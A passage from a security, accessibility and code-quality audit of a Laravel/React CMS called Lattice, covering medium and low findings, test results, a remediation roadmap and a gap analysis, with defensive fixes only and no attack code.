  self-sufficient.

**Effort:** Small (Option 2) / Medium (Option 1).

---

### M-10 — No security headers and no CSP; the root template needs inline script and style

|                |                                                                                        |
| -------------- | -------------------------------------------------------------------------------------- |
| **Severity**   | Medium (hardening)                                                                     |
| **Confidence** | High                                                                                   |
| **Source**     | OWASP Secure Headers Project (supplementary); Laravel middleware docs                  |
| **Files**      | `bootstrap/app.php:30-34` (no header middleware), `resources/views/app.blade.php:9-27` |

**Current behaviour.** Responses carry framework defaults only. The root view emits an inline
`<script>` (dark-mode bootstrap) and an inline `<style>` (background colour) — both of which a strict
CSP would block without a nonce/hash.

**Why it is a problem.** `Content-Security-Policy`, `X-Content-Type-Options: nosniff`,
`Referrer-Policy` and `frame-ancestors` are the cheap mitigations that limit the blast radius of any
future XSS (including H-01). Uploaded PDFs are served from the app origin without `nosniff`.

**Recommendation.** Add a small `SecurityHeaders` middleware to the `web` group:
`X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`,
`X-Frame-Options: SAMEORIGIN` (or CSP `frame-ancestors 'self'`), and a CSP that allows
`script-src 'self' 'nonce-…'` with the inline dark-mode script nonce-tagged (`@nonce` in Blade), or move
that bootstrap to a tiny external file to keep the policy hash-free.

**Effort:** Medium.

---

### M-11 — Build-time dependencies are production dependencies, and dev tooling carries critical advisories

|                |                                                            |
| -------------- | ---------------------------------------------------------- |
| **Severity**   | Medium (supply chain / hygiene)                            |
| **Confidence** | High                                                       |
| **Source**     | Vite docs (dev dependency); npm audit output               |
| **Files**      | `package.json` (`dependencies` block), `package-lock.json` |

**Current behaviour.** `vite`, `typescript`, `@types/react`, `@types/react-dom`, `concurrently` are
declared in `dependencies`. `npm audit` reports **8 advisories, 3 critical**, all reachable only through
dev/build tooling:

```
vite-plus          critical   (via tinypool, @vitest/browser)
tinypool           critical   Prototype Pollution gadget in worker options → RCE
oxfmt              critical   (via tinypool)
vitest, @vitest/*  moderate   Code injection via unauthenticated manual mock registration
fast-uri           moderate   URI scheme spoofing
```

**Why it is a problem.** The advisories affect machines that run the build (developer laptops, CI), not
runtime visitors — so severity stays Medium, not Critical. But the class matters: PR builds execute
third-party tooling, and the RCE gadget is in a worker pool that processes repository content.
Declaring the bundler as a production dependency also makes `npm install --omit=dev` meaningless and
slows image builds.

**Recommendation.** Move `vite`, `typescript`, `@types/*` and `concurrently` to `devDependencies`; run
`npm audit --omit=dev` in CI as the gate that matters; upgrade `vite-plus`/`vitest` when the fixes land
(they are new packages, so pin exact versions and re-audit).

**Effort:** Small.

---

### L-01 — Unvalidated `appearance` cookie flows into an inline script

|                |                                                                                           |
| -------------- | ----------------------------------------------------------------------------------------- |
| **Severity**   | Low                                                                                       |
| **Confidence** | High (data flow); exploitability Low (HTML escaping prevents breakout in script raw-text) |
| **Source**     | Laravel docs, Blade `@json`; OWASP output encoding                                        |
| **Files**      | `app/Http/Middleware/HandleAppearance.php:19`, `resources/views/app.blade.php:9-27`       |

**Current behaviour.** `View::share('appearance', $request->cookie('appearance') ?? 'system')` shares any
cookie value; the template interpolates it into a JS string literal and into `@class([...])`. The cookie
is in `encryptCookies(except: [...])`, i.e. client-writable by design.

**Why it is a problem.** It is safe today only because Blade's HTML escaping is not decoded inside
`<script>`. That is a fragile guarantee to rest a template on, and the value is never normalised to the
three legal states.

**Recommendation.** Validate in the middleware —
`$value = in_array($cookie, ['light','dark','system'], true) ? $cookie : 'system';` — and emit
`@json($appearance)` instead of `'{{ … }}'`.

**Effort:** Small.

---

### L-02 — Invitation acceptance: no throttling and a benign double-accept race

|                |                                                                                               |
| -------------- | --------------------------------------------------------------------------------------------- |
| **Severity**   | Low                                                                                           |
| **Confidence** | High                                                                                          |
| **Source**     | Laravel docs, rate limiting; OWASP ASVS (auth endpoints)                                      |
| **Files**      | `app/Http/Controllers/Auth/InvitationController.php:37-63`, `app/Models/Invitation.php:39-64` |

**Current behaviour.** Tokens are 48 random chars, stored `sha256`-hashed, expire in 7 days and are
single-use — good. But `POST /invitations/{token}` has no `throttle` middleware, and `accepted_at` is
checked _before_ the transaction (`resolve()` → `DB::transaction(...)`), with no `lockForUpdate`. Two
concurrent submissions can both pass the check; the second then fails on the `users.email` unique index
with a 500 rather than a validation error.

**Recommendation.** `->middleware('throttle:10,1')` on both invitation routes; re-read the invitation
inside the transaction with `lockForUpdate()` and convert the duplicate-email case into a
`ValidationException`.

**Effort:** Small.

---

### L-03 — No `declare(strict_types=1)` anywhere (0 / 115 files)

|                |                                                                          |
| -------------- | ------------------------------------------------------------------------ |
| **Severity**   | Low                                                                      |
| **Confidence** | High                                                                     |
| **Source**     | PHP manual, `strict_types`; project principle _Long-Term Sustainability_ |
| **Files**      | entire `app/` tree                                                       |

**Current behaviour.** Signatures are fully typed (params, returns, promoted properties, `readonly`), but
without `strict_types` the engine still coerces scalars at boundaries — a `"5"` arriving from a string
context is accepted for an `int` parameter, and a float silently truncates.

**Recommendation.** Enable Pint’s `declare_strict_types` rule and run it once
(`vendor/bin/pint --config` or `pint.json` `{"rules": {"declare_strict_types": true}}`), then fix the
handful of call sites the engine now rejects. Do it as a single isolated commit — it is mechanical but
touches every file.

**Effort:** Small (mechanical) / Medium (review surface).

---

### L-04 — Posts table lacks `scope`/`caption`, unlike the pages table

|                |                                                                                                    |
| -------------- | -------------------------------------------------------------------------------------------------- |
| **Severity**   | Low                                                                                                |
| **Confidence** | High                                                                                               |
| **Source**     | WCAG 1.3.1 (Info and Relationships); HTML table semantics                                          |
| **Files**      | `resources/js/pages/posts/index.tsx:207-226` vs `resources/js/pages/admin/pages/index.tsx:296-312` |

**Current behaviour.** The pages table uses `<caption class="sr-only">` and `<th scope="col">`. The
posts table uses bare `<th>` and no caption; the media/users screens use neither pattern (cards/no
tables).

**Recommendation.** Copy the pages-table markup into posts (and any future table). Consider a small
`<DataTable>` shell (the repo already has `components/data-table.tsx`) to stop the drift.

**Effort:** Small.

---

### L-05 — Dead disabled control in the sidebar (“Search… ⌘K”)

|                |                                                              |
| -------------- | ------------------------------------------------------------ |
| **Severity**   | Low                                                          |
| **Confidence** | High                                                         |
| **Source**     | UX principle _user needs first_; project rule “no dead code” |
| **File**       | `resources/js/components/app-sidebar.tsx:34-44`              |

**Current behaviour.** A `disabled` button labelled “Search…” with a `⌘K` keycap and
`title="Search arrives with the command palette"` renders on every admin screen. No command palette
exists.

**Why it is a problem.** It advertises a keyboard shortcut that does nothing, which reads as a bug
rather than a roadmap; disabled controls are also skipped by keyboard users, so it costs visual space
without function.

**Recommendation.** Remove it until the palette ships, or ship the palette (list search already exists
on each list screen).

**Effort:** Small.

---

### L-06 — No `prefers-reduced-motion` handling

**Severity:** Low · **Confidence:** High · **Files:** `resources/css/app.css`, Radix/Tailwind animation
classes throughout.

`tw-animate-css` and Radix enter/exit animations are applied without a
`@media (prefers-reduced-motion: reduce)` guard. **Recommendation:** add a global block that neutralises
non-essential animation durations (`*, ::before, ::after { animation-duration: 0.01ms !important;
transition-duration: 0.01ms !important; }` inside the media query). **Effort:** Small.

---

### L-07 — Placeholder test remains; no component-level frontend tests

**Severity:** Low · **Confidence:** High · **Files:** `tests/Unit/ExampleTest.php`; `package.json` (no
Vitest/Playwright config despite `vitest` arriving transitively).

The backend suite is meaningful (182 cases, behaviour-oriented). The frontend has **zero** automated
tests: the section renderer, `ConfirmDialog` focus behaviour, the media picker, and the editor’s
autosave state machine are untested. `tests/Unit/ExampleTest.php` is a starter stub
(`expect(true)->toBeTrue()`).

**Recommendation.** Delete the stub. Add Vitest + Testing Library for the pure components
(`section-renderer`, `status-badge`, `confirm-dialog` open/confirm/cancel) — these need no browser.
Playwright is optional; if added, cover the two flows that have already regressed in practice: public
page renders without admin chrome, and exactly one sidebar in `/admin`.

**Effort:** Medium.

---

### L-08 — Autosave has no ordering guard

**Severity:** Low · **Confidence:** Medium (from source) · **Files:**
`resources/js/pages/admin/pages/edit.tsx:243-265`

The debounced autosave fires `useHttp().patch()` with no sequence token and no abort. If two saves
overlap (slow network, quick successive edits, or a manual save racing the timer), the older request can
land last and the server's revision becomes the stale content while the UI shows “saved”.

**Recommendation.** Keep a `seq` ref, ignore responses whose `seq` is not the latest, and/or
`AbortController` the previous request. The route already returns `saved_at`; echo the client's sequence
back for a cheap sanity check.

**Effort:** Small.

---

### L-09 — Media usage index is missing the reverse composite index

**Severity:** Low · **Confidence:** Medium (query shape read from source) · **Files:**
`database/migrations/2026_10_24_000010_create_media_folders_and_usages.php:28`,
`app/Cms/Media/MediaLibrary.php` (`syncUsages`, `forgetUsages`)

The unique index is `(media_id, usable_type, usable_id, field)`. Sync/forget paths query by
`usable_type` + `usable_id`, which cannot use that index (wrong leftmost column).

**Recommendation.** Add `$table->index(['usable_type','usable_id']);` in a follow-up migration.

**Effort:** Small.

---

### L-10 — PDF uploads are served inline from the app origin without `nosniff`

**Severity:** Low · **Confidence:** Medium · **Files:** `app/Http/Requests/Admin/UploadMediaRequest.php:14`
(`pdf` in the allowlist), public disk (`storage/app/public/media/...`)

Accepting PDFs is reasonable for a CMS; SVG is correctly excluded (the classic stored-XSS vector). The
residual risk is a same-origin PDF rendered by the browser's viewer, mitigated in most browsers but
best paired with `X-Content-Type-Options: nosniff` (see M-10) and, if the risk appetite is low,
`Content-Disposition: attachment` for documents via a controller route.

**Effort:** Small (folded into M-10).

---

## 6. Testing, Accessibility, Performance, and Security Results

### 6.1 Automated results

| Area                    | What ran                                                          | Result                                                                                                                                           |
| ----------------------- | ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Backend tests           | Pest, 31 files / ~182 cases                                       | **Green at this commit** (181 passed / 1330 assertions, 1 excluded pre-existing Fortify token test); _not re-executed in this audit environment_ |
| Backend style           | Pint (`preset: laravel`), 197 files                               | Green at this commit                                                                                                                             |
| Backend static analysis | Larastan level 7 over `app/ bootstrap/ config/ database/ routes/` | Green at this commit                                                                                                                             |
| Frontend types          | `tsc --noEmit`                                                    | **Fails on a fresh clone** (M-02); green after a build                                                                                           |
| Frontend lint           | `eslint --max-warnings 0`                                         | **Fails on a fresh clone** (same root cause); green after a build                                                                                |
| Build                   | `vite build` (rolldown, Vite 8)                                   | Not runnable here (needs PHP for Wayfinder); green in-session before the sandbox reset (7.5 s)                                                   |
| Dependency advisories   | `npm audit`                                                       | 8 (3 critical) — all dev/build tooling (M-11)                                                                                                    |
| CI config               | `.github/workflows/tests.yml`                                     | Correct ordering, pinned action SHAs, `permissions: contents: read`, `persist-credentials: false`; Postgres unused (M-09)                        |

### 6.2 Manual inspection — accessibility

_Present and correct:_ `lang` from locale; single `<main>` landmark in the admin (`AppContent` →
`SidebarInset`, so no nested `<main>`); Radix dialogs (focus trap, Escape, labelled title/description);
`<caption class="sr-only">` and `scope="col"` on the pages table; `aria-label` on icon-only buttons (57
occurrences); `focus-visible` rings on custom `role="button"` surfaces; decorative logo `alt=""` inside
a link that carries `aria-label`; keyboard-activatable media cards (Enter **and** Space); sonner toasts
as live regions; destructive actions behind an explicit dialog whose Cancel is the first tab stop.

_Gaps:_ no admin skip link (M-04); no `aria-current` (M-05); posts table semantics (L-04); no
reduced-motion handling (L-06).

_Not verified:_ colour contrast in either theme (the `--status-*` and muted-foreground pairs look
plausible in the screenshots but were not measured), zoom/reflow at 400 %/320 px, real screen-reader
announcements, focus behaviour after Inertia partial reloads.

### 6.3 Manual inspection — performance

_Good:_ dashboard ≤12 queries (asserted in `DashboardTest:79-98`); `AbilityMap` collapses gate lookups
into two queries; public settings cached; notifications deferred; Inter bundled locally; per-page code
chunks; `AddLinkHeadersForPreloadedAssets`.

_Concerns:_ pages index aggregate queries (M-08); media index payload (M-07); `%LIKE%` search on
unindexed columns (acceptable at this scale, note for growth); no HTTP caching for public pages
(justifiable — nav/settings/sections are dynamic).

### 6.4 Security posture

_Confirmed good:_ authorization on every mutation (policies + `FormRequest::authorize()` — audited all
admin controllers and all 13 form requests); no `dangerouslySetInnerHTML`; rich text is rendered as
plain paragraphs; invitation tokens hashed/expiring/single-use; preview URLs signed with `noindex,nofollow`;
upload MIME allowlist + 12 MB cap + UUID filenames; `#[Fillable]` on models; CSRF via Inertia;
`httpOnly` + `SameSite=Lax` session cookie; `DB::prohibitDestructiveCommands` in production; no
secrets in the repository; 2FA and passkeys available behind `confirmPassword`.

_Confirmed issues:_ H-01 (stored XSS via link fields), H-02 (trusted-proxy spoofing → throttle bypass),
L-01, L-02, L-10, M-10 (headers).

_Inherent, documented:_ addons/themes are PHP folders that execute on boot — the trust model is
“whoever can write to `app/Addons` owns the server”. Worth stating explicitly in
`docs/ADDON_DEVELOPMENT.md`, because the UI's one-click “activate” makes it feel safer than it is.

---

## 7. Positive Practices Worth Keeping

1. **Registry-driven content validation.** `SectionRegistry` generates both the editor schema and the
   server rules from one PHP definition; `UpdatePageRequest::after()` validates the normalised tree and
   silently drops unknown sections. This eliminates the usual CMS drift between form and validator.
2. **Authorization discipline.** Every admin mutation is gated twice (middleware for coarse access,
   policy/`authorize()` for the resource). All 13 form requests implement `authorize()`. `MediaPolicy`
   and `PagePolicy` encode ownership rules rather than leaving them to controllers.
3. **Addon lifecycle with error isolation.** `SafeMode` catches provider failures at boot, records
   `last_error` and keeps the app running; `EnsureAddonActive` turns disabled routes into 404s without
   deleting rows — verified behaviourally by tests and by hand.
4. **Honest delete semantics.** Inline confirm dialogs with Cancel-first focus, toast-based undo for
   media/pages, trash with restore instead of hard deletes, and a two-step “type the handle” uninstall.
5. **Deterministic, idempotent demo data.** `DemoSeeder` uses relative dates and natural-key upserts,
   draws fixtures with GD (no binary blobs in git), and has a test asserting a second run changes
   nothing.
6. **Query-budget test for the dashboard**, and a documented `--exclude-filter` for the one known
   environment-specific Fortify test.
7. **Operational tooling that tells the truth**: `lattice:doctor` (core tables, addon statuses, theme,
   storage link, and now which frontend bundle is being served — including a _stale build_ warning).
8. **CI hygiene**: pinned action SHAs, minimal `permissions`, `persist-credentials: false`, and a gate
   script (`composer ci:check`) that runs lint, types, static analysis and tests in one command.

---

## 8. Prioritized Remediation Roadmap

### P0 — Release-blocking (security)

| ID   | Task                                                                                   | Effort | Depends on |
| ---- | -------------------------------------------------------------------------------------- | ------ | ---------- |
| H-01 | Validate URL schemes on `cta_url` / `button_url`; renderer-side guard; regression test | S      | —          |
| H-02 | Replace `trustProxies('*')` with a `TRUSTED_PROXIES` allowlist (empty default)         | S      | —          |

### P1 — Correctness, security, accessibility, workflow

| ID   | Task                                                                                         | Effort                             | Depends on            |
| ---- | -------------------------------------------------------------------------------------------- | ---------------------------------- | --------------------- |
| M-01 | Stop committing state-dependent registries (or commit the neutral state + assert clean tree) | S-M                                | —                     |
| M-02 | Make `types:check`/lint self-sufficient or fail with a clear “build first” message           | S                                  | M-01 (same generator) |
| M-03 | Reserved-slug validation shared with the route list                                          | S                                  | —                     |
| M-04 | Skip link + `#main-content` in the admin shell                                               | S                                  | —                     |
| M-05 | `aria-current="page"` from `SidebarMenuButton`                                               | S                                  | —                     |
| M-10 | Security headers middleware; nonce or externalise the inline bootstrap                       | M                                  | —                     |
| M-09 | Decide and encode the CI database matrix                                                     | S (SQLite-only) / M (Postgres leg) | —                     |

### P2 — Maintainability, UX, performance

| ID   | Task                                                                                                | Effort | Depends on |
| ---- | --------------------------------------------------------------------------------------------------- | ------ | ---------- |
| M-06 | Render and/or remove the featured image feature                                                     | M      | —          |
| M-07 | Move `usages_detail` behind an on-demand endpoint                                                   | S-M    | —          |
| M-08 | Single grouped count query on the pages index + query-count assertion                               | S      | —          |
| M-11 | Move build tooling to `devDependencies`; `npm audit --omit=dev` in CI; upgrade `vite-plus`/`vitest` | S      | —          |
| L-01 | Allowlist the `appearance` cookie; `@json` in Blade                                                 | S      | —          |
| L-02 | Throttle invitation routes; `lockForUpdate`; duplicate-email as validation error                    | S      | —          |
| L-04 | Table semantics (caption/scope), ideally via the shared `data-table` component                      | S      | —          |
| L-07 | Delete the placeholder test; add Vitest coverage for pure components                                | M      | —          |

### P3 — Optional / cleanup

| ID   | Task                                                                                                         | Effort |
| ---- | ------------------------------------------------------------------------------------------------------------ | ------ |
| L-03 | Enable `declare_strict_types` project-wide (isolated commit)                                                 | S-M    |
| L-05 | Remove or implement the “Search… ⌘K” affordance                                                              | S      |
| L-06 | `prefers-reduced-motion` guard                                                                               | S      |
| L-08 | Autosave sequence guard / abort                                                                              | S      |
| L-09 | Reverse index on `media_usages`                                                                              | S      |
| L-10 | `nosniff` + attachment disposition for documents                                                             | S      |
| —    | Inertia persistent layouts (`Component.layout`) instead of per-page `<AppLayout>`; removes a whole bug class | M      |
| —    | Document the addon trust model in `docs/ADDON_DEVELOPMENT.md`                                                | S      |

**Quick wins (≤1 hour total, no dependencies):** H-01 (validation + renderer guard), H-02 (env-driven
proxies), M-03 (reserved slugs), M-04 (skip link), M-05 (`aria-current`), L-01 (cookie allowlist),
L-05 (delete the dead control), L-09 (index), L-04 (table markup).

**Sequencing note:** M-01 and M-02 share a root cause (generated artifacts and their lifecycle). Fix
them in one change: decide tracking policy, make the scripts regenerate, update README + CI in the same
commit. M-09 should follow, because the CI file is touched by M-11 as well.

---

## 9. Final Gap Analysis

| Area                            | Current state                                                                    | Target state                                                                     | Required actions                                          |
| ------------------------------- | -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- | --------------------------------------------------------- |
| **Laravel / PHP**               | Production-shaped: policies, form requests, typed code, Larastan 7, tight schema | Same, plus strict types and driver parity in CI                                  | H-02, M-09, L-02, L-03                                    |
| **React / TypeScript**          | Strict TS, composition-heavy, no raw HTML, compiler build                        | Component tests; consistent table semantics                                      | L-04, L-07, L-08                                          |
| **Inertia**                     | Clean server-owned props, deferred heavy data, `useHttp` autosave                | One layout source of truth (persistent layouts)                                  | Layout refactor (P3); M-07 (payload)                      |
| **shadcn/ui / Tailwind**        | Correct v4 setup, vendored primitives, token-based theme                         | Same, with semantic primitives (`aria-current`) and a11y review of composed UI   | M-04, M-05, L-06                                          |
| **UX**                          | Thoughtful states, undo, autosave, guards                                        | No dead affordances; contextual actions                                          | L-05, M-06                                                |
| **Accessibility (WCAG 2.2 AA)** | Good primitives, gaps in shell-level semantics, unmeasured contrast              | Passing 2.4.1/1.3.1/2.4.8; contrast verified in both themes                      | M-04, M-05, L-04; then a manual audit with a real browser |
| **Performance**                 | Bounded dashboard, cached settings, chunked assets                               | No redundant aggregates; payload proportional to view                            | M-07, M-08                                                |
| **Security**                    | Strong authorization, safe rendering by construction, hashed tokens              | URL-scheme validation, trusted proxies, headers/CSP, throttled public endpoints  | H-01, H-02, M-10, L-01, L-02                              |
| **QA / CI**                     | 182 behaviour-focused tests, 4 gates, pinned actions                             | Reproducible gates from a clean clone; intentional driver matrix; frontend tests | M-02, M-09, L-07                                          |
| **Docs / reproducibility**      | README + 4 docs, `PROGRESS.md` with deviations; deterministic install            | Docs match the artifact lifecycle (generated files, gates, trust model)          | M-01, M-02, addon trust note                              |

**Bottom line.** Lattice is a credible, unusually well-audited CMS core whose remaining risk is
concentrated and cheap to retire: two small security fixes (H-01, H-02), one packaging decision (M-01,
M-02), then accessibility and performance polish. Nothing found requires redesigning the architecture —
and several of the things that would normally be findings here (validation drift, N+1 on the dashboard,
untraceable content history, XSS via rich text) have already been designed out.
